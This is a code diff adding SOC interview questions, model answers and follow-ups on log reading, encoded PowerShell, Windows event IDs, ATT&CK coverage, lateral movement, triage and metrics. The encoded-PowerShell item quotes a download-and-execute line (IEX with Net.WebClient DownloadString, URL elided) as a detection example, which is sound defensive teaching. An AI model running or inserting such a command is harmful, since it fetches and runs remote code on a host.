@@ -184,4 +184,95 @@ export const SOC = [
         answer: 'Sample closed alerts, not just open ones. A small weekly review of a random handful of benign closures catches both bad runbooks and queue pressure, and it does it without singling anyone out. Reviewing only what blew up means you only ever learn from the ones that blew up.' },
     ],
   },
+
+  /* ----------------------------------------- batch 1 (added 2026-11-22) */
+  {
+    slug: "read-auth-line", level: "fresher", topic: "log-reading",
+    prompt: "Here is one line from an auth log: `Failed password for invalid user admin from 203.0.113.5`. What does it tell you, and what does it not?",
+    answer: "It tells you someone tried to log in as admin, that the account does not exist on this host, that it came from that IP, and that it failed. It does not tell you whether this is one stray attempt or one of thousands, whether it is automated or aimed at you, or whether anything succeeded. A candidate who has read logs separates the fact in the line from the story they want to put around it.",
+    followUps: [
+      { prompt: "The same IP has four hundred of these in ten minutes. Does your read change?",
+        answer: "The volume says spray or brute force, not a targeted human, and invalid user says they are guessing account names that do not exist. Still low severity on its own. The thing I now look for is a line that is not a failure." },
+      { prompt: "There is one Accepted password line in the middle of them. Now what?",
+        answer: "That flips it. A success in the middle of a brute force is the whole event. I scope that account, that source, and that session, and I start looking for what they did after they were in, not at the failures before." },
+    ],
+  },
+  {
+    slug: "internet-is-slow", level: "fresher", topic: "network",
+    prompt: "A user says the internet is slow. From a SOC seat, what could that mean to you that it does not mean to them?",
+    answer: "To them it is an annoyance. To a SOC it is a possible symptom: a link saturated by exfiltration, a host beaconing hard, a denial-of-service, or a proxy failing. I do not diagnose the complaint, I ask what the traffic looks like, because slow is sometimes the only thing a user notices when something is leaving the network.",
+    followUps: [
+      { prompt: "Where do you look first?",
+        answer: "Egress: the proxy, firewall, or netflow for throughput and top talkers, and whether anything is going somewhere it should not. The complaint points at the link; the answer is in what is using it." },
+      { prompt: "The top talker is one internal host sending to one external IP, a steady two megabytes a second for an hour. Your read?",
+        answer: "A steady, long, one-to-one transfer is exfiltration-shaped, not browsing. I scope the host, check the destination's reputation and who it belongs to, and find the process doing it before I decide it is backup traffic." },
+    ],
+  },
+  {
+    slug: "encoded-powershell", level: "fresher", topic: "encoding",
+    prompt: "You see `powershell -enc SQBFAFgA...` in a process-creation log. What is it, and what do you do?",
+    answer: "The -enc flag runs base64-encoded PowerShell, where the base64 decodes to UTF-16LE text. It is a common obfuscation but not proof of anything on its own, since admins and installers use it too. I decode it and judge it on what it actually does, rather than reacting to the flag.",
+    followUps: [
+      { prompt: "Decoded, it is `IEX (New-Object Net.WebClient).DownloadString('http://...')`. Severity?",
+        answer: "High. That is download-and-execute from an external URL: pull code off the internet and run it in memory. I isolate the host, grab the URL and what it served, and work out what ran and under whose account." },
+      { prompt: "The user is a developer who does this every day. Still high?",
+        answer: "The context lowers it but does not zero it. I confirm it is their known pattern and not a lookalike, because a thing this user does daily is also exactly how a real one hides in plain sight." },
+    ],
+  },
+  {
+    slug: "windows-event-ids", level: "fresher", topic: "windows",
+    prompt: "Which Windows event IDs do you actually watch, and why those?",
+    answer: "The ones that show access, privilege, and persistence, not a memorised list: 4625 and 4624 for failed and successful logons with their type, 4672 for a logon granted special privileges, 4688 for process creation, 4720 for a new account, 7045 for a new service. I would rather know cold why each of those matters than recite twenty I have never alerted on.",
+    followUps: [
+      { prompt: "You see 4672 for a service account at three in the morning. Interesting?",
+        answer: "Potentially. A special-privilege logon for a service account off-hours is worth a look, but it depends on whether that account is meant to run scheduled or interactive work. The question is whether this matches how it normally behaves." },
+      { prompt: "How do you tell a scheduled task from someone logging in at the keyboard?",
+        answer: "The logon type: 2 is interactive, 3 network, 4 batch, 5 service, 10 remote desktop. The type is the tell, and it is why I said with their type rather than just the event number." },
+    ],
+  },
+  {
+    slug: "mitre-day-to-day", level: "mid", topic: "mitre",
+    prompt: "How do you actually use MITRE ATT&CK day to day, beyond putting it on a slide?",
+    answer: "As a coverage map and a shared language. I map detections to techniques to find the gaps, and I tag alerts with the technique so triage knows what stage it is. What I do not do is treat it as a checklist to cover everything, which is how you end up with a wall of weak detections. Someone who has used it talks about gaps and trade-offs, not completeness.",
+    followUps: [
+      { prompt: "Your manager wants a hundred percent ATT&CK coverage. Your response?",
+        answer: "Coverage is not a percentage. Some techniques your telemetry cannot see, some are not worth the noise, and a detection that exists only to tick a box is worse than an honest gap. I would prioritise by the threats that actually target us and the data we already have." },
+      { prompt: "A technique you genuinely cannot detect: what do you do with it?",
+        answer: "Document the gap, decide whether the telemetry to close it is worth adding, and compensate elsewhere in the chain if it is not. A written, known gap is an asset. A fake detection over it is a liability, because it tells you you are safe when you are not." },
+    ],
+  },
+  {
+    slug: "lateral-in-logs", level: "mid", topic: "lateral-movement",
+    prompt: "What does lateral movement actually look like in your logs, as opposed to in a diagram?",
+    answer: "A pattern across hosts, not a single event: one account authenticating to many machines in a short window, type-3 network logons to systems it never normally touches, use of admin shares, PsExec or WMI, and new service installs appearing on the targets. The arrow in the diagram is, in the data, a spray of ordinary-looking logons that are wrong only in aggregate.",
+    followUps: [
+      { prompt: "If you could weight one signal above the rest, which?",
+        answer: "An account authenticating to hosts outside its normal set, especially with administrative rights. The specific tool matters less than the deviation from what that account usually touches." },
+      { prompt: "You have no baseline of what is normal. Now what?",
+        answer: "I build a rough one from the data I do have, who normally logs into what, or I lean on the structural tells that are suspicious regardless: a service install on a workstation, PsExec between peers, a brand-new admin account. Some things do not need a baseline to look wrong." },
+    ],
+  },
+  {
+    slug: "two-alerts-one-minute", level: "mid", topic: "triage",
+    prompt: "Same minute, one analyst: a malware detection auto-quarantined on a finance laptop, and a single failed VPN login for the CFO. Which do you take first, and why?",
+    answer: "The VPN one, briefly. Auto-quarantine means the EDR has already acted, so that laptop is probably contained; a failed login on a high-value account could be the front edge of something that is not contained yet. I prioritise by what is still live and who it touches, not by which label sounds scarier.",
+    followUps: [
+      { prompt: "The failed VPN login was the CFO mistyping their password, confirmed. Back to the malware?",
+        answer: "Yes, and now I treat it properly: what the sample was, how it arrived, whether it ran before quarantine caught it, and whether anything else on that host is affected." },
+      { prompt: "How do you know the quarantine actually held?",
+        answer: "I check the EDR action succeeded, the file is neutralised, no child processes spawned before it was caught, and there were no network callouts. Quarantined in the console is a claim; I want to see it was quarantined in time." },
+    ],
+  },
+  {
+    slug: "soc-board-metrics", level: "mid", topic: "metrics",
+    prompt: "You are asked for SOC metrics for a board deck. What do you report, and what do you refuse to report?",
+    answer: "I report things that reflect outcomes: how fast we detect and respond, our true-positive rate, gaps we have closed. I refuse vanity numbers like alerts processed or threats blocked, which reward noise and sound impressive while saying nothing. Part of the job is protecting the board from a number that would mislead them.",
+    followUps: [
+      { prompt: "The board loves threats blocked: two million. You know it is mostly firewall noise. What do you do?",
+        answer: "I reframe it honestly: that figure is traffic, not threats, and I offer a metric that means something, even if the number is smaller and less flattering. A true small number beats an impressive false one." },
+      { prompt: "Your mean-time-to-respond looks bad this quarter because of one long incident. Report it?",
+        answer: "Yes, with the context. Hiding it is how metrics lose trust. One explained outlier is more credible than a smooth average someone quietly massaged, and the board can handle the truth better than finding out later." },
+    ],
+  },
+
 ];
